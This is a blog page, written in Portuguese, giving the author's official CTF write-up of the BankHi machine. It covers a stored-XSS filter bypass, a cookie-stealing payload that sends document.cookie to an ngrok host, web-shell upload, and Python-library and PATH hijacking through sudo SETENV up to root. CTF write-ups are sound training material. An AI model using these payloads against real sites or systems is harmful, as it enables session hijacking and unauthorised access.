@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>UHCCTF (Classificatória) - BankHi (Official Write-Up) | big0us</title>
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="UHCCTF (Classificatória) - BankHi (Official Write-Up)" />
+<meta name="author" content="Vinicius Pereira" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:site_name" content="big0us" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-15T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="UHCCTF (Classificatória) - BankHi (Official Write-Up)" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificatória) - BankHi (Official Write-Up)","dateModified":"2020-04-15T00:00:00+00:00","url":"/2020/04/15/uhc-bankhi.html","datePublished":"2020-04-15T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2020/04/15/uhc-bankhi.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.gif
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">UHCCTF (Classificatória) - BankHi (Official Write-Up)</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/pt-br/">pt-br</a>
+      
+      <a class="tag" href="/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/tag/write-up/">write-up</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 15 Apr 2020</div>
+  
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-72MZ89K41P');
+</script>
+
+<p>Essa foi a primeira máquina que eu criei e ela é muito especial para mim, espero que gostem 🙂</p>
+
+<p>Ela foi feita pensando na exploração de técnicas de Hijacking.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>easter egg → bank name = Hi          
+name of background image = jack.jpg
+team developer name = jack
+HiJack - Hijacking :) 
+</code></pre></div></div>
+
+<h1 id="recon">Recon</h1>
+
+<p><img src="/assets/bankhi/Untitled.png" alt="/assets/bankhi/Untitled.png" /></p>
+
+<p>A página principal parece ser de um banco normal, dando uma lida percebemos que existe uma sessão sobre o time do banco:</p>
+
+<p><img src="/assets/bankhi/Untitled%201.png" alt="/assets/bankhi/Untitled%201.png" /></p>
+
+<p>Ok, já sabemos o nome de possíveis usuários administradores!</p>
+
+<p>Dando mais uma navegada podemos encontrar uma página um tanto quanto interessante:</p>
+
+<p><img src="/assets/bankhi/Untitled%202.png" alt="/assets/bankhi/Untitled%202.png" /></p>
+
+<p>Parece que o Banco tem um programa próprio de Bug Bounty (recompensa por bugs).</p>
+
+<p>Mesmo assim vamos fazer um fuzzing no site.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt <span class="nt">-u</span> <span class="s1">'https://bankhi.uhclabs.com/FUZZ'</span> <span class="nt">-c</span>
+</code></pre></div></div>
+
+<p><img src="/assets/bankhi/Untitled%203.png" alt="/assets/bankhi/Untitled%203.png" /></p>
+
+<p>É, nada de interessante, todas essas pastas com status 301 estão com acesso negado 😢.</p>
+
+<p>Vamos ver esse tal programa de BugBounty e fazer um fuzzing nele:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt <span class="nt">-u</span> <span class="s1">'https://bankhi.uhclabs.com/bugbounty/FUZZ'</span> <span class="nt">-c</span>
+</code></pre></div></div>
+
+<p><img src="/assets/bankhi/Untitled%204.png" alt="/assets/bankhi/Untitled%204.png" /></p>
+
+<p>Só retornou um diretório de uploads, mas não existe directory listening. Talvez se usássemos outra wordlist eu teria pego index.php, login.php, report.php…</p>
+
+<p>Temos de cara uma página de login e um link para criar usuários. (login.php)</p>
+
+<p><img src="/assets/bankhi/Untitled%205.png" alt="/assets/bankhi/Untitled%205.png" /></p>
+
+<p>Os três botões ali em cima eu preciso estar autenticado para usar, depois de testar algumas credenciais padrão e não ter sucesso vamos criar um user!</p>
+
+<p>Depois de criar um user e logar, temos acesso ao index.php</p>
+
+<p><img src="/assets/bankhi/Untitled%206.png" alt="/assets/bankhi/Untitled%206.png" /></p>
+
+<p>Dando uma olhada no source code… Temos nossa primeira flag.</p>
+
+<p><img src="/assets/bankhi/Untitled%207.png" alt="/assets/bankhi/Untitled%207.png" /></p>
+
+<p>Parece ser uma página de reports. É importante ressaltar que os admins podem ver nossos reports 🤔.</p>
+
+<p>Vamos fazer um report:</p>
+
+<p><img src="/assets/bankhi/Untitled%208.png" alt="/assets/bankhi/Untitled%208.png" /></p>
+
+<p><img src="/assets/bankhi/Untitled%209.png" alt="/assets/bankhi/Untitled%209.png" /></p>
+
+<p>Agora vamos ver como ele se faz no código html:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">&lt;h5</span> <span class="na">class=</span><span class="s">'card-title'</span><span class="nt">&gt;</span>test<span class="nt">&lt;/h5&gt;</span>
+<span class="nt">&lt;h6</span> <span class="na">class=</span><span class="s">'card-subtitle mb-2 text-muted; text-warning'</span><span class="nt">&gt;</span>Open<span class="nt">&lt;/h6&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">'card-text text-info'</span><span class="nt">&gt;</span>From: vinicius<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">'card-text'</span><span class="nt">&gt;</span>test<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Ok, vamos testar um XSS aqui, não é muito comum em CTFs mas se os admins realmente verem nossos reports provavelmente poderemos executar scripts maliciosos na página deles.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> alert('xss') <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>Vou usar o clássico dos clássicos</p>
+
+<p><img src="/assets/bankhi/Untitled%2010.png" alt="/assets/bankhi/Untitled%2010.png" /></p>
+
+<p><img src="/assets/bankhi/Untitled%2011.png" alt="/assets/bankhi/Untitled%2011.png" /></p>
+
+<p>Interessante… Parece que a aplicação removeu nosso script e nosso alert (muito comum os sites bloquearem o alert…) Parece que teremos que fazer um bypass disso, normalmente podemos inserir uma palavra proibida dentro de outra, assim quando a aplicação remover a palavra proibida, vai concatenar a nossa palavra.</p>
+
+<p><img src="/assets/bankhi/Untitled%2012.png" alt="/assets/bankhi/Untitled%2012.png" /></p>
+
+<p>Nossa payload:</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span> alealertrt('xss') <span class="p">&lt;/</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>Vamos enviar e ver se da certo.</p>
+
+<p><img src="/assets/bankhi/Untitled%2013.png" alt="/assets/bankhi/Untitled%2013.png" /></p>
+
+<p>Bom parece que o site está vulnerável a XSS storage, vamos pesquisar o que podemos fazer com isso… Hm, Session Hijacking, podemos roubar cookies dos usuários que verem nosso report (admins ?).</p>
+
+<p><img src="/assets/bankhi/Untitled%2014.png" alt="/assets/bankhi/Untitled%2014.png" /></p>
+
+<p>Temos um cookie de um token JWT com nosso usuário. Vamos desencodar.</p>
+
+<p><img src="/assets/bankhi/Untitled%2015.png" alt="/assets/bankhi/Untitled%2015.png" /></p>
+
+<p>Uid significa UserId, normalmente usado para dizer os privilégios de cada usuário. Como não temos a chave do token não podemos alterar esse valor. Porém sabemos que cada usuário tem um token e com esse token poderiamos roubar a sessão do usuário (Session Hijacking).</p>
+
+<h2 id="session-hijacking">Session Hijacking</h2>
+
+<p>Vamos procurar alguma payload, vou usar essa:</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span>
+new Image().src='2.tcp.ngrok.io:17224/'+(document.cookie);
+<span class="p">&lt;/</span><span class="nt">scscriptript</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>Isso vai fazer com que o browser faça uma requisição para meu IP do ngrok + a porta do ngrok  com os cookies da sessão do usuário que estiver acessando a página.</p>
+
+<p>Vamos enviar e abrir nosso netcat para receber o request.</p>
+
+<p>Não funcionou</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://2.tcp.ngrok.io:17224/</span><span class="dl">'</span><span class="o">+</span><span class="p">(.);</span>
+</code></pre></div></div>
+
+<p>Se analisarmos a aplicação retirou a palavra “document” e a palavra “cookie”, logo vamos fazer a mesma coisa que fizemos com script e está feito nosso bypass.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span>
+new Image().src='http://2.tcp.ngrok.io:18238/'+(docdocumentument.cookcookieie);
+<span class="p">&lt;/</span><span class="nt">scscriptript</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/bankhi/Untitled%2016.png" alt="/assets/bankhi/Untitled%2016.png" /></p>
+
+<p>Agora vamos usar esse token que pegamos: (se botarmos esse token no <a href="http://jwt.io">jwt.io</a> ele vai mostrar o uid:1)</p>
+
+<p><img src="/assets/bankhi/Untitled%2017.png" alt="/assets/bankhi/Untitled%2017.png" /></p>
+
+<p>Mais uma Flag! Session Hijacking feito com Sucesso.</p>
+
+<p>Agora temos um formulário de upload.</p>
+
+<p>Pelo jeito podemos fazer o upload de php, vamos upar uma shell…</p>
+
+<p>Agora vamos ver aquele diretório que o ffuf apontou o /uploads, se nossa shell está lá.</p>
+
+<p><img src="/assets/bankhi/Untitled%2018.png" alt="/assets/bankhi/Untitled%2018.png" /></p>
+
+<p>Como estou escrevendo esse write-up no dia do UHC temos um load-balancer rodando, por isso vamos dar f5 algumas vezes…</p>
+
+<p><img src="/assets/bankhi/Untitled%2019.png" alt="/assets/bankhi/Untitled%2019.png" /></p>
+
+<p>Habemos Shell !</p>
+
+<h1 id="pós-exploitation">Pós-Exploitation</h1>
+
+<h2 id="part-1">Part 1</h2>
+
+<p>Agora que temos shell vou transforma-la numa shell mais responsiva para trabalharmos melhor…</p>
+
+<p><img src="/assets/bankhi/Untitled%2020.png" alt="/assets/bankhi/Untitled%2020.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Full tty shell
+in your shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+in your terminal~ stty raw -echo; fg
+ENTER
+in your shell~ export TERM=xterm
+</code></pre></div></div>
+
+<p>Agora poderemos trabalhar melhor, vamos começar dando uma olhada na máquina, parece que temos dois users, um chamado ronald e outro leia (estamos como o user do apache www-data), e no / temos um arquivo chamado welcome.txt</p>
+
+<p><img src="/assets/bankhi/Untitled%2021.png" alt="/assets/bankhi/Untitled%2021.png" /></p>
+
+<p>Parece a senha do ronald, agora vamos logar como ronald, e logo na home dele temos mais uma flag!</p>
+
+<p><img src="/assets/bankhi/Untitled%2022.png" alt="/assets/bankhi/Untitled%2022.png" /></p>
+
+<p>Ok, pelo o que parece teremos que fazer uma escalação de privilégios horizontal e pegar o user da leia.</p>
+
+<p>Poderíamos rodar um linpeas para enumerar, mas logo no “sudo -l” já temos algo interessante:</p>
+
+<p><img src="/assets/bankhi/Untitled%2023.png" alt="/assets/bankhi/Untitled%2023.png" /></p>
+
+<p>Isso significa que com o user ronald podemos rodar /usr/bin/python3.7 /opt/bingo.py setando uma variável de ambiente sem usar senha como o user leia.</p>
+
+<p>Isso está com cara de Python Lib Hijacking</p>
+
+<p>Vamos então ler esse script <a href="http://bingo.py">bingo.py</a>…</p>
+
+<h3 id="python-lib-hijacking">Python Lib Hijacking</h3>
+
+<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">Linux Privilege Escalation</a></p>
+
+<p><img src="/assets/bankhi/Untitled%2024.png" alt="/assets/bankhi/Untitled%2024.png" /></p>
+
+<p>O básico de Python LIb Hijacking é sobre escrever uma das bibliotecas importadas no script, no caso vamos usar a socketserver…</p>
+
+<p>Criei uma pasta oculta no /tmp para nao leakar o exploit no meio do campeonato…</p>
+
+<p><img src="/assets/bankhi/Untitled%2025.png" alt="/assets/bankhi/Untitled%2025.png" /></p>
+
+<p>Escrevi um script com uma função chamando uma shell interativa, assim quando rodarmos o <a href="http://bingo.py">bingo.py</a> como a leia, o bingo.py importará a nossa lib fake chamando uma shell como a leia. Mas como fazemos o python entender que é para usar a nossa lib? O SETENV no /etc/sudoers significa que podemos dizer o valor de alguma variável de ambiente do linux, e existe uma variável de ambiente que diz onde ficam os arquivos do python incluindo as libs, então temos só que dizer que esse diretório é o nosso /tmp/.a/ .</p>
+
+<p><img src="/assets/bankhi/Untitled%2026.png" alt="/assets/bankhi/Untitled%2026.png" /></p>
+
+<p>Gooooood</p>
+
+<p>Agora como a leia podemos ver que a próxima flag estava na home dela.</p>
+
+<p><img src="/assets/bankhi/Untitled%2027.png" alt="/assets/bankhi/Untitled%2027.png" /></p>
+
+<h2 id="part-2---root">Part 2 - Root</h2>
+
+<p>Poderia ter rodado o linpeas mas novamente o “sudo -l” nos disse algo:</p>
+
+<p><img src="/assets/bankhi/Untitled%2028.png" alt="/assets/bankhi/Untitled%2028.png" /></p>
+
+<p>Isso significa que o user leia pode rodar /bin/sl como root sem senha e setando uma variável de ambiente…</p>
+
+<p>Vamos ver esse sl.</p>
+
+<h3 id="path-hijacking">Path Hijacking</h3>
+
+<p><img src="/assets/bankhi/Untitled%2029.png" alt="/assets/bankhi/Untitled%2029.png" /></p>
+
+<p>LOL, Aparentemente ele faz um trem no terminal.</p>
+
+<p>Mas logo quando ele termina de passar o trem ele mostra um output um tanto quanto conhecido</p>
+
+<p><img src="/assets/bankhi/Untitled%2030.png" alt="/assets/bankhi/Untitled%2030.png" /></p>
+
+<p>Parece que ele está rodando um ls…</p>
+
+<p>Tudo indica que seja Path Hijacking, vou rodar o strace no sl para ver as chamadas de sistema para confirmar…</p>
+
+<p><img src="/assets/bankhi/unknown.png" alt="/assets/bankhi/unknown.png" /></p>
+
+<p>É ele está chamando o “ls” direto sem path, ou seja podemos manipular a variável PATH usando nosso SETENV, PATH é a variável que determina onde os arquivos executáveis do linux estão. Por exemplo para não digitar “/usr/bin/sudo” meu PATH terá “/usr/bin/” assim quando eu for rodar o comando “sudo” eu só preciso digitar “sudo”.</p>
+
+<p>Então temos que criar um ls malicioso…</p>
+
+<p>Usei o mesmo path que usamos para o python lib hijacking.</p>
+
+<p><img src="/assets/bankhi/Untitled%2031.png" alt="/assets/bankhi/Untitled%2031.png" /></p>
+
+<p>Escrevi um bash para apenas rodar um /bin/bash e chamar a shell interativa como root</p>
+
+<p>Agora o root…</p>
+
+<p><img src="/assets/bankhi/Untitled%2032.png" alt="/assets/bankhi/Untitled%2032.png" /></p>
+
+<p>E nossa flag de root merecida!</p>
+
+<p><img src="/assets/bankhi/Untitled%2033.png" alt="/assets/bankhi/Untitled%2033.png" /></p>
+
+<p>É isso.</p>
+
+<p>Essa foi a primeira maquina que eu fiz então espero que quem tenha jogado tenha gostado e sim eu sou fã de star wars, tem varios easter eggs espalhados na máquina kkskksks…</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
+            CTF LatinoWare 2021 - Planilhas Baby
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/04/uhc-cap.html">
+            UHCCTF (Classificatória) - Cap
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/03/uhc-storm.html">
+            UHCCTF (Classificatória) - Storm
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
